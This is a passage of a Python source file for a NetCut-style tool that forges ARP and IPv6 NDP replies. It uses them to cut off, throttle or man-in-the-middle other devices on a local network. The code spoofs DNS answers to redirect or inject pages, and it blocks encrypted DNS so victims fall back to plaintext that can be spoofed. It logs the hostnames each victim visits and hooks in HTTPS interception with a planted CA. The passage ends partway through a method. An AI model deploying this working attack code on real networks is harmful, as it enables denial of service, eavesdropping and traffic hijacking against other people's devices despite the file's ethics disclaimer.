#!/usr/bin/env python3
"""
netcut.py - NetCut-style ARP control for YOUR OWN network, built into net_tree.

What it does (same core as NetCut / arcai):
  * CUT      - drop a device off the internet by ARP-poisoning its cache so it sends
               its gateway traffic to a dead end.
  * RESUME   - stop poisoning and immediately heal the device's ARP cache.
  * PROTECT  - pin a static ARP entry for the gateway so nobody can cut *you*, and
               watch the wire for anyone running ARP spoofing, naming the attacker.

Requirements (Windows):
  * Npcap           (driver - the one Wireshark installs)
  * pip install scapy
  * Run as Administrator  (sending raw ARP frames + static ARP need admin)

ETHICS / LEGAL: cutting devices works by forging ARP. Do this ONLY on a network you
own or are authorised to manage. Cutting someone else's device off a network you do
not control is a denial-of-service attack and is illegal in most places. This tool
refuses non-private (non-LAN) address ranges on purpose.
"""
from __future__ import annotations

import argparse
import ctypes
import ipaddress
import logging
import os
import platform
import re
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

IS_WIN = platform.system() == "Windows"

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
if IS_WIN:
    os.system("")

_C = {"r": "\033[0m", "b": "\033[1m", "dim": "\033[2m", "g": "\033[32m", "y": "\033[33m",
      "c": "\033[36m", "red": "\033[31m", "m": "\033[35m"}


def col(text, *styles):
    return "".join(_C[s] for s in styles) + str(text) + _C["r"]


# --- scapy is heavy and needs Npcap; import it lazily so net_tree still runs without it ---
SCAPY_OK = False
SCAPY_ERR = ""
try:
    logging.getLogger("scapy").setLevel(logging.ERROR)
    from scapy.all import (ARP, Ether, IP, IPv6, TCP, UDP, DNS, DNSQR, DNSRR, srp, sendp,  # noqa: E402
                           sniff, conf, get_if_hwaddr, ICMPv6ND_NA, ICMPv6ND_RS, ICMPv6ND_RA,
                           ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr)
    conf.verb = 0
    SCAPY_OK = True
except Exception as e:  # pragma: no cover - only when scapy/Npcap missing
    SCAPY_ERR = f"{type(e).__name__}: {e}"

try:
    import mitm_tls
    MITM_OK = mitm_tls.CRYPTO_OK
except Exception:
    mitm_tls = None
    MITM_OK = False

# CA lives in a durable per-user folder so the phone only has to trust it once (not in the temp
# PyInstaller unpack dir, which is wiped every run).
CA_DIR = Path(os.environ.get("LOCALAPPDATA") or Path.home()) / "NetCut" / "ca"

INSTALL_HELP = col("""NetCut needs scapy + Npcap:
  1) Install Npcap:  https://npcap.com/#download   (tick "WinPcap API-compatible")
  2) pip install scapy
  3) Run this tool from an Administrator terminal.""", "y")

BOGUS_HINT = "ARP poisoning"  # tag written into a victim's open_ports so net_tree shows it


def is_admin():
    try:
        if IS_WIN:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


def norm_mac(mac):
    import re
    mac = re.sub(r"[^0-9a-fA-F]", "", mac or "").upper()
    return ":".join(mac[i:i + 2] for i in range(0, 12, 2)) if len(mac) == 12 else ""


# ----------------------------------------------------------------------------- environment

def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.255.255.255", 1))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def default_gateway():
    try:
        if IS_WIN:
            out = subprocess.run(["route", "print", "-4", "0.0.0.0"], capture_output=True,
                                 text=True, errors="replace", timeout=8).stdout
            import re
            m = re.search(r"^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)", out, re.M)
        else:
            out = subprocess.run(["ip", "route", "show", "default"], capture_output=True,
                                 text=True, errors="replace", timeout=8).stdout
            import re
            m = re.search(r"via (\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else None
    except Exception:
        return None


def pick_iface(my_ip):
    """Find the scapy NetworkInterface whose IPv4 is my_ip (so frames leave the right NIC)."""
    if not SCAPY_OK:
        return None
    try:
        for i in conf.ifaces.values():
            if getattr(i, "ip", None) == my_ip:
                return i
    except Exception:
        pass
    return conf.iface


def iface_index(ifobj):
    for attr in ("index", "win_index"):
        v = getattr(ifobj, attr, None)
        if v:
            return str(v)
    return None


@dataclass
class Env:
    my_ip: str
    my_mac: str
    gateway_ip: str
    gateway_mac: str
    iface: object
    network: ipaddress.IPv4Network
    gateway_ll: str = ""   # router's IPv6 link-local (e.g. fe80::1), for NDP poisoning

    @classmethod
    def detect(cls, prefix=24):
        my_ip = local_ip()
        gw = default_gateway()
        ifobj = pick_iface(my_ip)
        my_mac = norm_mac(get_if_hwaddr(ifobj)) if (SCAPY_OK and ifobj) else ""
        net = ipaddress.ip_network(f"{my_ip}/{prefix}", strict=False)
        gw_mac = resolve_mac(gw, ifobj) if (SCAPY_OK and gw and ifobj) else ""
        return cls(my_ip, my_mac, gw, gw_mac, ifobj, net)


def discover_router_ll(env, timeout=3.0):
    """Find the router's IPv6 link-local address (e.g. fe80::1) by soliciting a Router
    Advertisement. Returns '' if the network has no IPv6 router on this link."""
    if not SCAPY_OK:
        return ""
    found = {}

    def cb(p):
        try:
            if p.haslayer(ICMPv6ND_RA) and norm_mac(p.src) == env.gateway_mac:
                found["ll"] = p[IPv6].src
        except Exception:
            pass

    t = threading.Thread(target=lambda: sniff(
        filter="icmp6", iface=env.iface, prn=cb, store=False, timeout=timeout,
        stop_filter=lambda p: "ll" in found), daemon=True)
    t.start()
    time.sleep(0.3)
    try:
        sendp(Ether(dst="33:33:00:00:00:02", src=env.my_mac) / IPv6(dst="ff02::2") /
              ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=env.my_mac), iface=env.iface, verbose=0)
    except Exception:
        pass
    t.join(timeout + 0.5)
    return found.get("ll", "")


def resolve_mac(ip, iface, timeout=2.0, retry=2):
    """ARP-resolve a live host's MAC. Returns normalised MAC or ''. Needs admin to send."""
    if not SCAPY_OK:
        return ""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=timeout, iface=iface, retry=retry, verbose=0)
        for _, r in ans:
            return norm_mac(r.hwsrc)
    except Exception:
        pass
    return ""


def ip_forwarding_on():
    """If Windows IP forwarding is ON, a 'cut' turns into a silent man-in-the-middle instead of
    a clean disconnect. We want it OFF. Returns True/False/None(unknown)."""
    try:
        if IS_WIN:
            out = subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-NetIPInterface -AddressFamily IPv4 | Where-Object Forwarding -eq 'Enabled').Count"],
                capture_output=True, text=True, timeout=8).stdout.strip()
            return out.isdigit() and int(out) > 0
        return (open("/proc/sys/net/ipv4/ip_forward").read().strip() == "1")
    except Exception:
        return None


# ----------------------------------------------------------------------------- ARP packets

# Escalation ladder: how hard to poison. The verifier bumps the level when a device
# still looks connected. Each level is faster and uses more techniques.
#   1 = gentle : unicast ARP replies every 2s
#   2 = firm   : + gratuitous ARP requests, every 0.7s
#   3 = hard   : + broadcast poison to the whole subnet, every 0.25s
LEVEL_INTERVAL = {1: 2.0, 2: 0.7, 3: 0.25}
MAX_LEVEL = 3

# Weak-wifi (throttle) strengths: fraction of each ~1s cycle the device is poisoned.
# The rest of the cycle it is healed, so some packets get through -> laggy, lossy, not dead.
THROTTLE = {"light": 0.4, "medium": 0.65, "heavy": 0.85}
THROTTLE_PERIOD = 1.0

SHAPE_INTERVAL = 0.3  # how often to refresh the poison while shaping (fast, to hold the MITM)
SHAPE_LEVEL = 3       # shape needs an aggressive, held poison or the traffic bypasses us

# Well-known encrypted-DNS (DoH / DoT) resolver IPs. When "block_doh" is on we drop the device's
# traffic to these over 443/853, so its system resolver falls back to plaintext DNS we can spoof.
DOH_IPS = {
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "1.1.1.2", "1.0.0.2", "9.9.9.9", "149.112.112.112",
    "208.67.222.222", "208.67.220.220", "94.140.14.14", "94.140.15.15", "185.228.168.9", "76.76.2.0",
    "8.26.56.26", "64.6.64.6",
}


class Bucket:
    """Token bucket for bandwidth shaping. rate_bytes = bytes/sec; a packet is forwarded only
    if enough tokens have accumulated, otherwise it is dropped (TCP then backs off to the limit).
    rate_bytes <= 0 means 'no limit' (always allow)."""

    def __init__(self, mbps):
        self.set(mbps)
        self.tokens = self.cap
        self.ts = time.monotonic()

    def set(self, mbps):
        self.mbps = max(0.0, float(mbps or 0))
        self.rate = self.mbps * 125_000.0            # megabits/s -> bytes/s
        self.cap = max(self.rate * 0.05, 6000.0)     # ~50 ms burst, at least a few packets

    def allow(self, n):
        if self.rate <= 0:
            return True
        now = time.monotonic()
        self.tokens = min(self.cap, self.tokens + (now - self.ts) * self.rate)
        self.ts = now
        if self.tokens >= n:
            self.tokens -= n
            return True
        return False


# ----------------------------------------------------------------------------- traffic names

def _tls_sni(data: bytes):
    """Pull the Server Name (hostname) out of a TLS ClientHello. Works for HTTPS even though the
    rest is encrypted - the SNI is sent in the clear."""
    try:
        if len(data) < 45 or data[0] != 0x16:        # TLS handshake record
            return None
        i = 5
        if data[i] != 0x01:                          # ClientHello
            return None
        i += 4 + 2 + 32                              # handshake hdr + client version + random
        i += 1 + data[i]                             # session id
        i += 2 + int.from_bytes(data[i:i + 2], "big")  # cipher suites
        i += 1 + data[i]                             # compression methods
        ext_end = i + 2 + int.from_bytes(data[i:i + 2], "big")
        i += 2
        while i + 4 <= ext_end:
            etype = int.from_bytes(data[i:i + 2], "big")
            elen = int.from_bytes(data[i + 2:i + 4], "big")
            i += 4
            if etype == 0x00:                        # server_name extension
                ni = i + 2
                if ni < len(data) and data[ni] == 0x00:
                    nlen = int.from_bytes(data[ni + 1:ni + 3], "big")
                    host = data[ni + 3:ni + 3 + nlen].decode("ascii", "ignore")
                    return host or None
                return None
            i += elen
    except Exception:
        return None
    return None


def _http_host(data: bytes):
    try:
        if not data[:7].upper().startswith((b"GET ", b"POST ", b"HEAD ", b"PUT ", b"OPTIONS", b"DELETE")):
            return None
        m = re.search(rb"\r\nHost:\s*([^\r\n:]+)", data, re.I)
        return m.group(1).decode("ascii", "ignore") if m else None
    except Exception:
        return None


def request_name(pkt):
    """A human-readable name for what a packet is reaching out to: a DNS question, a TLS SNI
    hostname, or an HTTP Host. Returns (name, kind) or None."""
    try:
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd is not None:
            q = pkt[DNSQR].qname
            name = (q.decode("ascii", "ignore") if isinstance(q, bytes) else str(q)).rstrip(".")
            return (name, "dns") if name else None
        if pkt.haslayer(TCP) and pkt.haslayer("Raw"):
            payload = bytes(pkt["Raw"].load)
            dport = pkt[TCP].dport
            if dport == 443 or (payload[:1] == b"\x16"):
                sni = _tls_sni(payload)
                if sni:
                    return (sni, "tls")
            if dport == 80 or payload[:4].upper() in (b"GET ", b"POST", b"HEAD"):
                host = _http_host(payload)
                if host:
                    return (host, "http")
    except Exception:
        return None
    return None


def _poison_packets(env: Env, target_ip, target_mac, level=1, stack="both"):
    """Forged ARP/NDP that makes the target (and gateway) point at US instead of each other.
    `stack` picks which pipe to cut: "ipv4", "ipv6" or "both".
    With IP forwarding OFF, we receive their frames and drop them -> clean cut."""
    my, gw_ip, gw_mac = env.my_mac, env.gateway_ip, env.gateway_mac
    pkts = []
    if stack in ("both", "ipv4"):
        # tell the target: "the gateway is at my MAC"
        pkts.append(Ether(dst=target_mac) / ARP(op=2, psrc=gw_ip, hwsrc=my, pdst=target_ip, hwdst=target_mac))
        if gw_mac:
            # tell the gateway: "the target is at my MAC"  (kills the return path too)
            pkts.append(Ether(dst=gw_mac) / ARP(op=2, psrc=target_ip, hwsrc=my, pdst=gw_ip, hwdst=gw_mac))
        if level >= 2:
            # gratuitous ARP *requests* - some OSes trust these more than replies
            pkts.append(Ether(dst=target_mac) / ARP(op=1, psrc=gw_ip, hwsrc=my,
                                                    pdst=target_ip, hwdst="00:00:00:00:00:00"))
            if gw_mac:
                pkts.append(Ether(dst=gw_mac) / ARP(op=1, psrc=target_ip, hwsrc=my,
                                                    pdst=gw_ip, hwdst="00:00:00:00:00:00"))
        if level >= 3:
            # broadcast: refresh the poison even on devices we missed
            pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw_ip, hwsrc=my, pdst=target_ip))
            pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=target_ip, hwsrc=my, pdst=gw_ip))
    # ---- IPv6: poison the target's neighbour cache for the router (NDP) ----
    # A unicast Ethernet frame to the target carries a forged Neighbor Advertisement saying the
    # router's link-local is at MY mac. Only the target gets it (unicast L2), so just its IPv6 is
    # redirected to us and dropped -> IPv6 is cut too. No need to know the target's own IPv6.
    if stack in ("both", "ipv6") and env.gateway_ll:
        pkts.append(Ether(dst=target_mac, src=my) / IPv6(src=env.gateway_ll, dst="ff02::1") /
                    ICMPv6ND_NA(tgt=env.gateway_ll, R=1, S=0, O=1) / ICMPv6NDOptDstLLAddr(lladdr=my))
    return pkts


def _heal_packets(env: Env, target_ip, target_mac):
    """Correct ARP (+NDP) replies that restore the real mappings on both sides (always heals both)."""
    pkts = []
    if env.gateway_mac:
        pkts.append(Ether(dst=target_mac) / ARP(op=2, psrc=env.gateway_ip, hwsrc=env.gateway_mac,
                                               pdst=target_ip, hwdst=target_mac))
        pkts.append(Ether(dst=env.gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac,
                                                    pdst=env.gateway_ip, hwdst=env.gateway_mac))
    if env.gateway_ll:  # restore the real router in the target's IPv6 neighbour cache
        pkts.append(Ether(dst=target_mac, src=env.my_mac) / IPv6(src=env.gateway_ll, dst="ff02::1") /
                    ICMPv6ND_NA(tgt=env.gateway_ll, R=1, S=0, O=1) /
                    ICMPv6NDOptDstLLAddr(lladdr=env.gateway_mac))
    return pkts


def heal(env: Env, target_ip, target_mac, rounds=5):
    if not (SCAPY_OK and target_mac and env.gateway_mac):
        return
    pkts = _heal_packets(env, target_ip, target_mac)
    for _ in range(rounds):
        try:
            sendp(pkts, iface=env.iface, verbose=0)
        except Exception:
            break
        time.sleep(0.2)


# ----------------------------------------------------------------------------- cut manager

@dataclass
class Cut:
    ip: str
    mac: str
    thread: threading.Thread | None
    stop: threading.Event
    mode: str = "full"              # "full" cut | "throttle" weak wifi | "shape" Mbps | "monitor" watch
    stack: str = "both"             # which pipe to attack: "ipv4" | "ipv6" | "both"
    level: int = 1                  # escalation level 1-3 (full mode)
    throttle: float = 0.65          # fraction of each cycle poisoned (throttle mode)
    auto: bool = True               # auto-escalate if the device stays connected
    started: float = field(default_factory=time.time)
    sent: int = 0
    intercepted: int = 0            # internet-bound frames of the victim we've captured
    last_intercept: float = 0.0     # when we last saw one
    escapes: int = 0                # times the victim tried to re-find the gateway
    last_escape: float = 0.0
    repoison: threading.Event = field(default_factory=threading.Event)
    last_check: float = field(default_factory=time.time)
    checked_at_intercept: int = 0
    # ---- bandwidth shaping (mode == "shape") ----
    down_mbps: float = 0.0          # 0 = unlimited in that direction
    up_mbps: float = 0.0
    dbucket: Bucket | None = None   # download token bucket (gateway -> victim)
    ubucket: Bucket | None = None   # upload token bucket (victim -> gateway)
    down_bytes: int = 0
    up_bytes: int = 0
    dropped: int = 0
    down_rate: float = 0.0          # live measured Mbps
    up_rate: float = 0.0
    _rate_ts: float = field(default_factory=time.monotonic)
    _rate_d: int = 0
    _rate_u: int = 0
    # ---- traffic log (what the device is reaching out to) ----
    log: dict = field(default_factory=dict)   # name -> [count, last_ts, kind]
    log_total: int = 0


class CutManager:
    """Runs one background poisoning loop per target, plus ONE shared sniffer that verifies the
    cut (are we catching the victim's internet traffic?) and detects escape attempts."""

    def __init__(self, env: Env):
        self.env = env
        self.cuts: dict[str, Cut] = {}
        self._lock = threading.Lock()
        self._by_mac: dict[str, Cut] = {}
        self._shaped: dict[str, Cut] = {}     # victim ip -> cut, for the forwarding fast path
        self._l2 = None                        # persistent layer-2 socket for forwarding
        self._sniffer: threading.Thread | None = None
        self._sniff_stop = threading.Event()
        self._v6_tried = False
        # DNS spoofing: domain(lower) -> {"kind": "point"|"redirect"|"serve", "ip", "url", "html", "scope"}
        self.dns_rules: dict[str, dict] = {}
        self._redirect = None   # RedirectServer, started when a redirect/serve rule exists
        self.block_doh = False  # drop encrypted DNS so the device falls back to plaintext (spoofable)
        self._tls = None        # TlsServer (HTTPS interception on :443)
        self.https_intercept = False

    def set_https_intercept(self, on):
        """Turn HTTPS interception on/off. Needs the cryptography lib + admin (binds :443)."""
        if on:
            if not MITM_OK:
                return {"ok": False, "message": "cryptography not installed"}
            self._ensure_redirect()            # :80 also serves the CA download + install page
            if self._tls is None:
                self._tls = mitm_tls.TlsServer(CA_DIR)
            if self._tls.httpd is None and not self._tls.start():
                return {"ok": False, "message": "could not bind :443 (admin? port in use?)"}
            self.https_intercept = True
            if self._redirect:
                self._redirect.ca_pem = self._tls.ca_pem
            self._sync_server_rules()
            return {"ok": True, "message": "HTTPS interception on"}
        else:
            if self._tls:
                self._tls.stop(); self._tls = None
            self.https_intercept = False
            return {"ok": True, "message": "HTTPS interception off"}

    def ca_info(self):
        return {"available": MITM_OK, "intercept": self.https_intercept,
                "url": f"http://{self.env.my_ip}/netcut-ca.crt" if self.https_intercept else ""}

    # ---- DNS spoofing / redirects ----
    def set_rule(self, from_domain, target, scope="all", html=None):
        """Map a domain to somewhere else. scope = "all" (every watched/cut device) or a device IP.
        If `html` is given -> serve that page for the domain (content injection).
        Else target can be: an IP / bare domain -> point there; a URL -> 302 redirect there."""
        dom = str(from_domain).strip().lower().rstrip(".")
        target = str(target).strip()
        scope = str(scope).strip() or "all"
        if not dom:
            raise ValueError("empty domain")
        if html:
            self.dns_rules[dom] = {"kind": "serve", "ip": self.env.my_ip, "url": "", "html": html, "scope": scope}
            self._ensure_redirect()
        elif target.startswith(("http://", "https://")) or target.startswith("redirect:"):
            url = target[len("redirect:"):] if target.startswith("redirect:") else target
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            self.dns_rules[dom] = {"kind": "redirect", "ip": self.env.my_ip, "url": url, "html": "", "scope": scope}
            self._ensure_redirect()
        else:
            try:
                ip = target if re.match(r"^\d+\.\d+\.\d+\.\d+$", target) else socket.gethostbyname(target)
            except Exception as e:
                raise ValueError(f"could not resolve {target}: {e}")
            self.dns_rules[dom] = {"kind": "point", "ip": ip, "url": "", "html": "", "scope": scope}
        self._sync_server_rules()
        return self.dns_rules[dom]

    def _sync_server_rules(self):
        served = {d: r for d, r in self.dns_rules.items() if r["kind"] in ("redirect", "serve")}
        if self._redirect:
            self._redirect.rules = served
        if self._tls:
            self._tls.rules = served

    def set_block_doh(self, on):
        self.block_doh = bool(on)
        return self.block_doh

    def remove_rule(self, from_domain):
        self.dns_rules.pop(str(from_domain).strip().lower().rstrip("."), None)
        self._sync_server_rules()
        if self._redirect and not self._redirect.rules:
            self._redirect.stop(); self._redirect = None

    def list_rules(self):
        return [{"from": d, **{k: v for k, v in r.items() if k != "html"}, "has_html": bool(r.get("html"))}
                for d, r in self.dns_rules.items()]

    def _ensure_redirect(self):
        if self._redirect is None:
            self._redirect = RedirectServer(self.env.my_ip)
            self._redirect.start()
        self._sync_server_rules()

    def _match_rule(self, qname, device_ip=None):
        def ok(rule):
            sc = rule.get("scope", "all")
            return sc == "all" or sc == device_ip
        r = self.dns_rules.get(qname)
        if r and ok(r):
            return r
        # also match a parent rule for sub.domains (e.g. www.tung.co.il matches tung.co.il)
        for dom, rule in self.dns_rules.items():
            if qname.endswith("." + dom) and ok(rule):
                return rule
        return None

    def _spoof_dns(self, pkt, rule):
        try:
            q = pkt[DNS]
            qd = pkt[DNSQR]
            ipl, udpl = pkt[IP], pkt[UDP]
            dmac = norm_mac(pkt.src)
            if qd.qtype == 28:           # AAAA -> answer with nothing so the device uses our A record
                dns = DNS(id=q.id, qr=1, aa=1, rd=q.rd, ra=1, qd=q.qd, ancount=0)
            elif qd.qtype == 1:          # A -> our forged address
                rr = DNSRR(rrname=qd.qname, type="A", rclass="IN", ttl=30, rdata=rule["ip"])
                dns = DNS(id=q.id, qr=1, aa=1, rd=q.rd, ra=1, qd=q.qd, an=rr)
            else:
                return
            resp = (Ether(dst=dmac, src=self.env.my_mac) / IP(src=ipl.dst, dst=ipl.src) /
                    UDP(sport=udpl.dport, dport=udpl.sport) / dns)
            sendp(resp, iface=self.env.iface, verbose=0)
        except Exception:
            pass

    def _ensure_v6(self):
        """Find the router's IPv6 link-local once, in the background, so cuts also kill IPv6."""
        if self._v6_tried or self.env.gateway_ll or not SCAPY_OK:
            return
        self._v6_tried = True
        threading.Thread(
            target=lambda: setattr(self.env, "gateway_ll", discover_router_ll(self.env) or ""),
            daemon=True).start()

    def _l2send(self, dst_mac, ip_layer):
        """Forward an IP packet at layer 2 to dst_mac, from our own MAC."""
        try:
            if self._l2 is None:
                self._l2 = conf.L2socket(iface=self.env.iface)
            self._l2.send(Ether(dst=dst_mac, src=self.env.my_mac) / ip_layer)
            return True
        except Exception:
            return False

    # ---- the per-target poisoning loop ----
    def _loop(self, cut: Cut):
        env = self.env
        while not cut.stop.is_set():
            try:
                if cut.mode == "throttle":
                    # duty cycle: poison for part of the period, heal for the rest -> heavy loss
                    on = max(0.05, THROTTLE_PERIOD * cut.throttle)
                    off = max(0.05, THROTTLE_PERIOD - on)
                    sendp(_poison_packets(env, cut.ip, cut.mac, level=1, stack=cut.stack), iface=env.iface, verbose=0)
                    cut.sent += 2
                    if cut.stop.wait(on):
                        break
                    sendp(_heal_packets(env, cut.ip, cut.mac), iface=env.iface, verbose=0)
                    cut.stop.wait(off)
                elif cut.mode in ("shape", "monitor"):
                    # full MITM: steady poison so the flow diverts through us; the sniffer then
                    # forwards it (shape = at the Mbps limit, monitor = unlimited) and logs names.
                    # Monitor only touches IPv4 so the device keeps working while we watch it.
                    stack = "ipv4" if cut.mode == "monitor" else cut.stack
                    sendp(_poison_packets(env, cut.ip, cut.mac, level=SHAPE_LEVEL, stack=stack), iface=env.iface, verbose=0)
                    cut.sent += 1
                    cut.stop.wait(SHAPE_INTERVAL)
                else:  # full cut
                    sendp(_poison_packets(env, cut.ip, cut.mac, level=cut.level, stack=cut.stack), iface=env.iface, verbose=0)
                    cut.sent += 1
                    self._maybe_escalate(cut)
                    # wake early if the sniffer saw an escape attempt
                    if cut.repoison.wait(LEVEL_INTERVAL.get(cut.level, 2.0)):
                        cut.repoison.clear()
            except Exception:
                break

    def _maybe_escalate(self, cut: Cut):
        """Every few seconds: if the device is NOT being intercepted (still has its own path to
        the gateway) and auto-escalate is on, step the level up."""
        if cut.mode != "full" or not cut.auto:
            return
        now = time.time()
        if now - cut.last_check < 6:
            return
        gained = cut.intercepted - cut.checked_at_intercept
        cut.last_check, cut.checked_at_intercept = now, cut.intercepted
        # If we're not catching its traffic AND it was recently trying to reach the gateway,
        # the poison isn't holding -> escalate.
        looks_connected = gained == 0 and (now - cut.last_escape < 12)
        if looks_connected and cut.level < MAX_LEVEL:
            cut.level += 1
            print(col(f"\n[netcut] {cut.ip} still reaching the network - escalating to level {cut.level}.", "y"))

    # ---- shared sniffer: verification + escape detection ----
    def _on_packet(self, pkt):
        try:
            src = norm_mac(pkt.src)
        except Exception:
            return
        cut = self._by_mac.get(src)
        if pkt.haslayer(ARP):
            arp = pkt[ARP]
            # victim broadcasting "who has <gateway>?" = it's trying to re-find the real gateway
            if arp.op == 1 and cut and arp.pdst == self.env.gateway_ip:
                cut.escapes += 1
                cut.last_escape = time.time()
                cut.repoison.set()            # re-poison immediately
            # gateway asking "who has <victim>?" -> answer with poison to keep it fooled
            if arp.op == 1 and arp.pdst in self._ip_to_cut and arp.psrc == self.env.gateway_ip:
                vc = self._ip_to_cut[arp.pdst]
                try:
                    sendp(Ether(dst=self.env.gateway_mac) / ARP(op=2, psrc=vc.ip, hwsrc=self.env.my_mac,
                          pdst=self.env.gateway_ip, hwdst=self.env.gateway_mac), iface=self.env.iface, verbose=0)
                except Exception:
                    pass
            return
        if not (pkt.haslayer(IP) or pkt.haslayer(IPv6)):
            return
        # ---- traffic log: what is this device reaching out to? (victim's own outbound) ----
        if cut:
            nk = request_name(pkt)
            if nk:
                self._log(cut, nk[0], nk[1])
            # ---- DNS spoofing: answer mapped domains with our forged address ----
            if self.dns_rules and pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd is not None:
                try:
                    qn = pkt[DNSQR].qname
                    qname = (qn.decode("ascii", "ignore") if isinstance(qn, bytes) else str(qn)).rstrip(".").lower()
                except Exception:
                    qname = ""
                dev_ip = pkt[IP].src if pkt.haslayer(IP) else None
                rule = self._match_rule(qname, dev_ip) if qname else None
                if rule:
                    self._spoof_dns(pkt, rule)
        if not pkt.haslayer(IP):
            return
        ip = pkt[IP]
        # ---- shape / monitor: forward the victim's traffic (shape = Mbps limit, monitor = all) ----
        if self._shaped and norm_mac(pkt.dst) == self.env.my_mac:
            n = len(pkt)
            down = self._shaped.get(ip.dst)   # gateway -> victim  (download)
            up = self._shaped.get(ip.src)     # victim  -> gateway (upload)
            # SAFETY: never forward for a device that is a full/throttle cut. If one is stale in
            # _shaped, treat it as not-forwarded so the cut stays a clean, total cut (no leak).
            if down is not None and down.mode not in ("shape", "monitor"):
                down = None
            if up is not None and up.mode not in ("shape", "monitor"):
                up = None
            # drop the device's encrypted-DNS so it falls back to plaintext we can spoof
            if self.block_doh and up is not None:
                dport = pkt[TCP].dport if pkt.haslayer(TCP) else pkt[UDP].dport if pkt.haslayer(UDP) else 0
                if dport == 853 or (dport == 443 and ip.dst in DOH_IPS):
                    up.dropped += 1
                    return
            if down is not None:
                if down.dbucket.allow(n):
                    self._l2send(down.mac, ip); down.down_bytes += n
                else:
                    down.dropped += 1
                return
            if up is not None:
                if up.ubucket.allow(n):
                    self._l2send(self.env.gateway_mac, ip); up.up_bytes += n
                else:
                    up.dropped += 1
                return
        # a non-ARP frame from a cut victim that reached US means its traffic is being redirected
        if cut and cut.mode not in ("shape", "monitor"):
            try:
                off_subnet = ipaddress.ip_address(ip.dst) not in self.env.network
            except ValueError:
                off_subnet = True
            if off_subnet and ip.dst != self.env.my_ip:
                cut.intercepted += 1
                cut.last_intercept = time.time()

    def _log(self, cut: Cut, name, kind):
        name = name[:120]
        e = cut.log.get(name)
        if e:
            e[0] += 1
            e[1] = time.time()
        else:
            if len(cut.log) > 400:               # cap memory: drop the oldest-seen entry
                old = min(cut.log, key=lambda k: cut.log[k][1])
                cut.log.pop(old, None)
            cut.log[name] = [1, time.time(), kind]
        cut.log_total += 1

    def top_traffic(self, ip, limit=40):
        """The device's requests, most frequent first: [{name, count, kind, ago}]."""
        c = self.cuts.get(str(ip))
        if not c:
            return []
        now = time.time()
        rows = sorted(c.log.items(), key=lambda kv: (-kv[1][0], kv[1][1]))[:limit]
        return [{"name": n, "count": v[0], "kind": v[2], "ago": int(now - v[1])} for n, v in rows]

    def set_stack(self, ip, stack):
        c = self.cuts.get(str(ip))
        if c and stack in ("ipv4", "ipv6", "both"):
            c.stack = stack
            c.repoison.set()
            return stack
        return None

    def clear_log(self, ip):
        c = self.cuts.get(str(ip))
        if c:
            c.log.clear()
            c.log_total = 0

    @property
    def _ip_to_cut(self):
        return {c.ip: c for c in self.cuts.values()}

    def _ensure_sniffer(self):
        if self._sniffer or not SCAPY_OK:
            return
        self._sniff_stop.clear()

        def run():
            try:
                sniff(filter="arp or ip", iface=self.env.iface, prn=self._on_packet, store=False,
                      stop_filter=lambda p: self._sniff_stop.is_set())
            except Exception:
                pass
        self._sniffer = threading.Thread(target=run, daemon=True)
        self._sniffer.start()

    def _stop_sniffer_if_idle(self):
        if not self.cuts and self._sniffer:
            self._sniff_stop.set()
            self._sniffer = None
            if self._l2 is not None:
                try:
                    self._l2.close()
                except Exception:
                    pass
                self._l2 = None

    # ---- public API ----
    def start(self, target_ip, target_mac, mode="full", throttle="medium", auto=True,
              down_mbps=0.0, up_mbps=0.0, stack="both"):
        if not SCAPY_OK:
            raise RuntimeError("scapy/Npcap not available")
        ip = str(ipaddress.ip_address(target_ip))
        if ipaddress.ip_address(ip) not in self.env.network:
            raise ValueError(f"{ip} is not on your network ({self.env.network})")
        if ip in (self.env.my_ip, self.env.gateway_ip):
            raise ValueError("refusing to cut yourself or the gateway")
        if mode in ("shape", "monitor") and not self.env.gateway_mac:
            raise ValueError(f"gateway MAC unknown - can't {mode} without it")
        target_mac = norm_mac(target_mac) or resolve_mac(ip, self.env.iface)
        if not target_mac:
            raise ValueError(f"could not find the MAC address of {ip} (is it online?)")
        with self._lock:
            if ip in self.cuts:
                existing = self.cuts[ip]
                if mode != existing.mode:   # caller wants a different mode -> switch it cleanly
                    if mode in ("shape", "monitor"):
                        dm, um = (0.0, 0.0) if mode == "monitor" else (down_mbps, up_mbps)
                        existing.dbucket, existing.ubucket = Bucket(dm), Bucket(um)
                        self._shaped[ip] = existing
                    else:                    # full / throttle = never forwarded -> leave the shaped set
                        self._shaped.pop(ip, None)
                    existing.mode, existing.level = mode, 1
                    if stack in ("ipv4", "ipv6", "both"):
                        existing.stack = stack
                    existing.repoison.set()
                return existing
            cut = Cut(ip, target_mac, thread=None, stop=threading.Event(), mode=mode, auto=auto,
                      stack=stack if stack in ("ipv4", "ipv6", "both") else "both",
                      throttle=THROTTLE.get(throttle, 0.65) if isinstance(throttle, str) else float(throttle),
                      down_mbps=float(down_mbps or 0), up_mbps=float(up_mbps or 0))
            if mode in ("shape", "monitor"):
                # monitor = unlimited forward (device stays online); shape = Mbps-limited
                dm, um = (0.0, 0.0) if mode == "monitor" else (cut.down_mbps, cut.up_mbps)
                cut.dbucket, cut.ubucket = Bucket(dm), Bucket(um)
                self._shaped[ip] = cut
